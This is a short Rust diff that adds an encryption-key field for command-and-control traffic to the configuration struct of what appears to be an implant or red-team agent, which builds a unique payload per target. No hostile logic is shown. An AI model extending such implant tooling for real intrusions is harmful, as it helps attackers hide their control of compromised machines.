@@ -17,6 +17,9 @@ pub struct AgentConfig {
     pub pipe_name:  Option<String>,
     /// Build identifier — unique per generated payload.
     pub build_id:   String,
+    /// Hex-encoded 32-byte AES-GCM key. Empty = plaintext comms.
+    #[serde(default)]
+    pub c2_key:     String,
 }
 
 // ── Embedded config ───────────────────────────────────────────────────────────
